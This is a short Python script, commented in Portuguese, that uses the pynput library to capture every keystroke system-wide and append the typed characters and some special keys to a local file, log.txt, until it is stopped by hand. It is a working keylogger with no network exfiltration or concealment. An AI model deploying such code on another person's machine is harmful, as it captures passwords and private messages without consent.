from pynput import keyboard


# Ignorar teclas que não tem valor
IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

#função que é ativada toda vez que o teclado é utilizado

def on_press(key):
    try:
        # se for um caracter
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)

    #Teclas que não são caracteres, mas ainda são importantes
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass
            else:
                f.write(f"{[key]}")

#faz o script continuar rodando até ser parado manualmente
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
